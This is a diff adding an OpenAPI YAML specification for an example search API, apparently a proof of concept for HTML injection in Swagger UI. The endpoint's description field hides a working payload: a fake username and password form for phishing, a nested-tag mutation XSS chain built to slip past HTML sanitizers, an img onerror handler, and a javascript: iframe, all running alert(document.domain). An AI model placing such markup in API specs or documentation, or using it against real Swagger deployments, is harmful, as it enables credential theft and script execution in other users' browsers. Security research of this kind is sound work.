@@ -1,0 +1,30 @@
+openapi: 3.0.0
+info:
+  title: Example API
+  version: 1.0.0
+  description: This is an example API.
+paths:
+  /search:
+    get:
+      summary: Search for items
+      description: |
+        Use this endpoint to search for items by keyword.
+        
+        <h1>HTMLi via Swagger: <a href="https://synack.com">Click Here</a></h1><br><form><label>Username:<br><input name="username" type="text"><br><label>Password<label><br><input type="password" name="password"><br><input value="submit" type="submit"></form><form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"><iframe src="javascript:alert(document.domain);"></form>
+        
+      responses:
+        '200':
+          description: OK
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  type: object
+                  properties:
+                    id:
+                      type: integer
+                      example: 1
+                    name:
+                      type: string
+                      example: Example Item
